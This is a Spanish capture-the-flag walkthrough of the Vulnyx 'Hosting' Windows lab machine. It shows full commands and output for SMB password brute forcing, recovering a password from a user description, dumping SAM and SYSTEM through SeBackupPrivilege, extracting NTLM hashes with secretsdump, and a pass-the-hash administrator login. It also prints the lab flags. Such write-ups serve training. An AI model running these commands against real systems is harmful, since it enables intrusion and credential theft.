---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Hosting Vulnyx (Easy - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-01 04:05 EDT
Nmap scan report for 192.168.5.69
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  tcpwrapped
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:02:B5:6D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: HOSTING, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:02:b5:6d (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-01T08:07:40
|_  start_date: N/A
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.56 seconds
```

Veremos varios puertos interesantes, entre ellos el `SAMBA` y el puerto `80`, si entramos al puerto `80` veremos una pagina web de `IIS` normal y corriente, por lo que no veremos gran cosa, vamos a intentar enumerar el puerto `SAMBA` a ver que encontramos.

Si intentamos enumerarlo de forma anonima veremos que no podremos, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt,asp,aspx -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.69/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,asp,aspx
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/speed                (Status: 200) [Size: 29831]
Progress: 122814 / 122820 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que hemos descubierto un directorio web llamado `/speed`, si entramos dentro veremos una pagina web nueva en la que parece todo normal, no hay nada fuera de lo normal.

```
URL = http://<IP>/speed
```

Si bajamos un poco en la pagina veremos `4` usuarios de la pagina de la empresa, vamos a utilizar sus nombres de `email` como nombres de usuarios para realizar una fuerza bruta con `netexec` a ver si tenemos suerte.

## Escalate user p.smith

### Netexec

> users.txt

```
p.smith
a.krist
m.faeny
k.lendy
```

Vamos a pasar el `rockyou.txt` a limpio en `UTF-8` para que no de error.

```shell
iconv -f ISO-8859-1 -t UTF-8//IGNORE /usr/share/wordlists/rockyou.txt \
| tr -d '\r' > rockyou_utf8.txt
```

Una vez echo todo esto, vamos a ejecutar el comando.

```shell
netexec smb <IP> -u users.txt -p rockyou_utf8.txt
```

Info:

```
..............................<RESTO_DE_CODIGO>....................................
SMB         192.168.5.69    445    HOSTING          [+] HOSTING\p.smith:kissme
```

Veremos que ha funcionado, vamos a probar a conectarnos por `WinRM` ya que tenemos el puerto abierto a ver si funciona.

## Escalate user j.wilson

### enum4linux

```shell
evil-winrm -i <IP> -u p.smith -p 'kissme'
```

Pero veremos que no nos dejara, por lo que vamos a intentar otra via, probaremos a realizar un poco de `fuzzing` por `SAMBA` a ver que vemos.

Vamos a realizar una enumeracion de forma completa con `enum4linux` y las credenciales encontradas.

```shell
enum4linux -a -u 'p.smith' -p 'kissme' <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Aug  1 04:36:48 2025

 =========================================( Target Information )=========================================

Target ........... 192.168.5.69
RID Range ........ 500-550,1000-1050
Username ......... 'p.smith'
Password ......... 'kissme'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 192.168.5.69 )============================


[+] Got domain/workgroup name: WORKGROUP


 ================================( Nbtstat Information for 192.168.5.69 )================================

Looking up status of 192.168.5.69
        HOSTING         <00> -         B <ACTIVE>  Workstation Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        HOSTING         <20> -         B <ACTIVE>  File Server Service

        MAC Address = 08-00-27-02-B5-6D

 ===================================( Session Check on 192.168.5.69 )===================================


[+] Server 192.168.5.69 allows sessions using username 'p.smith', password 'kissme'
                                                                                                                                                             
                                                                                                                                                             
 ================================( Getting domain SID for 192.168.5.69 )================================
                                                                                                                                                             
Domain Name: WORKGROUP                                                                                                                                       
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                         
                                                                                                                                                             
                                                                                                                                                             
 ===================================( OS information on 192.168.5.69 )===================================
                                                                                                                                                             
                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
[+] Got OS info for 192.168.5.69 from srvinfo:                                                                                                               
        192.168.5.69   Wk Sv NT                                                                                                                              
        platform_id     :       500
        os version      :       10.0
        server type     :       0x1003


 =======================================( Users on 192.168.5.69 )=======================================
                                                                                                                                                             
index: 0x1 RID: 0x1f4 acb: 0x00000211 Account: Administrador    Name: (null)    Desc: (null)                                                                 
index: 0x2 RID: 0x3ea acb: 0x00000214 Account: administrator    Name: Administrator     Desc: (null)
index: 0x3 RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount   Name: (null)    Desc: (null)
index: 0x4 RID: 0x3ec acb: 0x00000214 Account: f.miller Name: Frank Miller      Desc: (null)
index: 0x5 RID: 0x1f5 acb: 0x00000215 Account: Invitado Name: (null)    Desc: (null)
index: 0x6 RID: 0x3ee acb: 0x00000214 Account: j.wilson Name: John Wilson       Desc: (null)
index: 0x7 RID: 0x3ed acb: 0x00000214 Account: m.davis  Name: Mike Davis        Desc: H0$T1nG123!
index: 0x8 RID: 0x3eb acb: 0x00000214 Account: p.smith  Name: Paul Smith        Desc: (null)
index: 0x9 RID: 0x1f8 acb: 0x00000011 Account: WDAGUtilityAccount       Name: (null)    Desc: (null)

user:[Administrador] rid:[0x1f4]
user:[administrator] rid:[0x3ea]
user:[DefaultAccount] rid:[0x1f7]
user:[f.miller] rid:[0x3ec]
user:[Invitado] rid:[0x1f5]
user:[j.wilson] rid:[0x3ee]
user:[m.davis] rid:[0x3ed]
user:[p.smith] rid:[0x3eb]
user:[WDAGUtilityAccount] rid:[0x1f8]

 =================================( Share Enumeration on 192.168.5.69 )=================================
                                                                                                                                                             
do_connect: Connection to 192.168.5.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                      

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.5.69                                                                                                                 
                                                                                                                                                             
//192.168.5.69/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                            
//192.168.5.69/C$       Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                               
                                                                                                                                                             
NT_STATUS_NO_SUCH_FILE listing \*                                                                                                                            
//192.168.5.69/IPC$     Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 192.168.5.69 )============================
                                                                                                                                                             
                                                                                                                                                             

[+] Attaching to 192.168.5.69 using p.smith:kissme

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:192.168.5.69)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] HOSTING
        [+] Builtin

[+] Password Info for Domain: HOSTING

        [+] Minimum password length: None
        [+] Password history length: None
        [+] Maximum password age: 41 days 23 hours 53 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 1 minute 
        [+] Locked Account Duration: 256 days 2 hours 48 minutes 
        [+] Account Lockout Threshold: 999
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Password Complexity: Disabled                                                                                                                                
Minimum Password Length: 0


 =======================================( Groups on 192.168.5.69 )=======================================
                                                                                                                                                             
                                                                                                                                                             
[+] Getting builtin groups:                                                                                                                                  
                                                                                                                                                             
group:[Administradores] rid:[0x220]                                                                                                                          
group:[Administradores de Hyper-V] rid:[0x242]
group:[Duplicadores] rid:[0x228]
group:[IIS_IUSRS] rid:[0x238]
group:[Invitados] rid:[0x222]
group:[Lectores del registro de eventos] rid:[0x23d]
group:[Operadores criptográficos] rid:[0x239]
group:[Operadores de asistencia de control de acceso] rid:[0x243]
group:[Operadores de configuración de red] rid:[0x22c]
group:[Operadores de copia de seguridad] rid:[0x227]
group:[Propietarios del dispositivo] rid:[0x247]
group:[System Managed Accounts Group] rid:[0x245]
group:[Usuarios] rid:[0x221]
group:[Usuarios avanzados] rid:[0x223]
group:[Usuarios COM distribuidos] rid:[0x232]
group:[Usuarios de administración remota] rid:[0x244]
group:[Usuarios de escritorio remoto] rid:[0x22b]
group:[Usuarios del monitor de sistema] rid:[0x22e]
group:[Usuarios del registro de rendimiento] rid:[0x22f]

[+]  Getting builtin group memberships:                                                                                                                      
                                                                                                                                                             
Group: Usuarios de administración remota' (RID: 580) has member: HOSTING\j.wilson                                                                            
Group: Operadores de copia de seguridad' (RID: 551) has member: HOSTING\j.wilson
Group: Usuarios' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group: Usuarios' (RID: 545) has member: NT AUTHORITY\Usuarios autentificados
Group: Usuarios' (RID: 545) has member: HOSTING\administrator
Group: Usuarios' (RID: 545) has member: HOSTING\p.smith
Group: Usuarios' (RID: 545) has member: HOSTING\f.miller
Group: Usuarios' (RID: 545) has member: HOSTING\m.davis
Group: Usuarios' (RID: 545) has member: HOSTING\j.wilson
Group: Invitados' (RID: 546) has member: HOSTING\Invitado
Group: System Managed Accounts Group' (RID: 581) has member: HOSTING\DefaultAccount
Group: Administradores' (RID: 544) has member: HOSTING\Administrador
Group: Administradores' (RID: 544) has member: HOSTING\administrator

[+]  Getting local groups:                                                                                                                                   
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local group memberships:                                                                                                                        
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain groups:                                                                                                                                  
                                                                                                                                                             
group:[Ninguno] rid:[0x201]                                                                                                                                  

[+]  Getting domain group memberships:                                                                                                                       
                                                                                                                                                             
Group: 'Ninguno' (RID: 513) has member: HOSTING\Administrador                                                                                                
Group: 'Ninguno' (RID: 513) has member: HOSTING\Invitado
Group: 'Ninguno' (RID: 513) has member: HOSTING\DefaultAccount
Group: 'Ninguno' (RID: 513) has member: HOSTING\WDAGUtilityAccount
Group: 'Ninguno' (RID: 513) has member: HOSTING\administrator
Group: 'Ninguno' (RID: 513) has member: HOSTING\p.smith
Group: 'Ninguno' (RID: 513) has member: HOSTING\f.miller
Group: 'Ninguno' (RID: 513) has member: HOSTING\m.davis
Group: 'Ninguno' (RID: 513) has member: HOSTING\j.wilson

 ==================( Users on 192.168.5.69 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                             
                                                                                                                                                             
[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-21-3084561998-2733067770-554905821                                                                                                                     

[+] Enumerating users using SID S-1-5-80 and logon username 'p.smith', password 'kissme'                                                                     
                                                                                                                                                             
                                                                                                                                                             
[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'p.smith', password 'kissme'                          
                                                                                                                                                             
                                                                                                                                                             
[+] Enumerating users using SID S-1-5-32 and logon username 'p.smith', password 'kissme'                                                                     
                                                                                                                                                             
S-1-5-32-544 BUILTIN\Administradores (Local Group)                                                                                                           
S-1-5-32-545 BUILTIN\Usuarios (Local Group)
S-1-5-32-546 BUILTIN\Invitados (Local Group)
S-1-5-32-547 BUILTIN\Usuarios avanzados (Local Group)
[+] Enumerating users using SID S-1-5-21-3084561998-2733067770-554905821 and logon username 'p.smith', password 'kissme'                                     
                                                                                                                                                             
S-1-5-21-3084561998-2733067770-554905821-500 HOSTING\Administrador (Local User)                                                                              
S-1-5-21-3084561998-2733067770-554905821-501 HOSTING\Invitado (Local User)
S-1-5-21-3084561998-2733067770-554905821-503 HOSTING\DefaultAccount (Local User)
S-1-5-21-3084561998-2733067770-554905821-504 HOSTING\WDAGUtilityAccount (Local User)
S-1-5-21-3084561998-2733067770-554905821-513 HOSTING\Ninguno (Domain Group)
S-1-5-21-3084561998-2733067770-554905821-1002 HOSTING\administrator (Local User)
S-1-5-21-3084561998-2733067770-554905821-1003 HOSTING\p.smith (Local User)
S-1-5-21-3084561998-2733067770-554905821-1004 HOSTING\f.miller (Local User)
S-1-5-21-3084561998-2733067770-554905821-1005 HOSTING\m.davis (Local User)
S-1-5-21-3084561998-2733067770-554905821-1006 HOSTING\j.wilson (Local User)

[+] Enumerating users using SID S-1-5-90 and logon username 'p.smith', password 'kissme'

[+] Enumerating users using SID S-1-5-82-3006700770-424185619-1745488364-794895919 and logon username 'p.smith', password 'kissme'                           
                                                                                                                                                             
                                                                                                                                                             
 ===============================( Getting printer info for 192.168.5.69 )===============================
                                                                                                                                                             
No printers returned.                                                                                                                                        


enum4linux complete on Fri Aug  1 04:39:02 2025
```

Vemos algo bastante interesante en esta linea:

```
index: 0x7 RID: 0x3ed acb: 0x00000214 Account: m.davis  Name: Mike Davis        Desc: H0$T1nG123!
```

Vemos que en la descripcion de dicho usuario hay una palabra que parece ser una contarseña, si la probamos de esta forma:

```shell
netexec smb <IP> -u m.davis -p 'H0$T1nG123!'
```

Veremos que no sera de dicho usuario, pero si empezamos a probar con otros usuarios, veremos que si funciona con el siguiente:

```shell
netexec smb <IP> -u j.wilson -p 'H0$T1nG123!'
```

Info:

```
SMB         192.168.5.69    445    HOSTING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:HOSTING) (domain:HOSTING) (signing:False) (SMBv1:False)
SMB         192.168.5.69    445    HOSTING          [+] HOSTING\j.wilson:H0$T1nG123!
```

Este si funciona, por lo que vamos a probar a iniciar una `shell` mediante `evil-winrm` a ver si funciona con este usuario.

### Evil-winrm

```shell
evil-winrm -i <IP> -u j.wilson -p 'H0$T1nG123!'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\j.wilson\Documents> whoami
hosting\j.wilson
```

Veremos que nos ha funcionado, por lo que vamos a leer la `flag` del usuario.

> user.txt

```
50e5add3f5cb0642fefc5e907086b313
```

## Escalate Privileges

Si listamos los permisos que tenemos veremos lo siguiente:

```powershell
whoami /priv
```

Info:

```
INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                         Estado
============================= =================================================== ==========
SeBackupPrivilege             Hacer copias de seguridad de archivos y directorios Habilitada
SeRestorePrivilege            Restaurar archivos y directorios                    Habilitada
SeShutdownPrivilege           Apagar el sistema                                   Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido                    Habilitada
SeUndockPrivilege             Quitar equipo de la estaci¢n de acoplamiento        Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso        Habilitada
SeTimeZonePrivilege           Cambiar la zona horaria                             Habilitada
```

Veremos la siguiente linea:

```
SeBackupPrivilege   Hacer copias de seguridad de archivos y directorios Habilitada
```

Vemos que podemos realizar `backups` como el administrador, por lo que vamos a copiarnos el `SAM` y el `SYSTEM` para posteriormente intentar sacarle los `hashes NTLM`.

```powershell
mkdir C:\temp
cd C:\temp
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
```

Info:

```
La operaci¢n se complet¢ correctamente.
La operaci¢n se complet¢ correctamente.
```

Veremos que se realizo todo correctamente:

```powershell
dir
```

Info:

```
Directorio: C:\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          8/1/2025  11:00 AM          57344 sam
-a----          8/1/2025  11:00 AM       12001280 system
```

Ahora vamos a pasarnoslo a nuestra maquina `host` de esta forma ya que estamos trabajando con `evil-winrm`:

```powershell
cd C:\temp
download sam
download system
```

Info:

```
Info: Downloading C:\temp\sam to sam
                                        
Info: Download successful!

Info: Downloading C:\temp\system to system
                                        
Info: Download successful!
```

Ahora desde nuestro `kali` vamos a extraer los `hashes` de esta forma:

```shell
impacket-secretsdump LOCAL -sam sam -system system
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x827cc782adafc2fd1b7b7a48da1e20ba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8afe1e889d0977f8571b3dc0524648aa:::
administrator:1002:aad3b435b51404eeaad3b435b51404ee:41186fb28e283ff758bb3dbeb6fb4a5c:::
p.smith:1003:aad3b435b51404eeaad3b435b51404ee:2cf4020e126a3314482e5e87a3f39508:::
f.miller:1004:aad3b435b51404eeaad3b435b51404ee:851699978beb72d9b0b820532f74de8d:::
m.davis:1005:aad3b435b51404eeaad3b435b51404ee:851699978beb72d9b0b820532f74de8d:::
j.wilson:1006:aad3b435b51404eeaad3b435b51404ee:a6cf5ad66b08624854e80a8786ad6bac:::
[*] Cleaning up...
```

Ahora vamos a probar a realizar un `Pass-The-Hash` con `evil-winrm` con el `hash NTLM` del administrador.

```shell
evil-winrm -i 192.168.5.69 -u administrator -H 41186fb28e283ff758bb3dbeb6fb4a5c
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\administrator\Documents> whoami
hosting\administrator
```

Veremos que ha funcionado, por lo que ya seremos `administradores` y podremos leer la `flag` de `root`.

> root.txt

```
9924b42399b3e0704068a3012871dc98
```
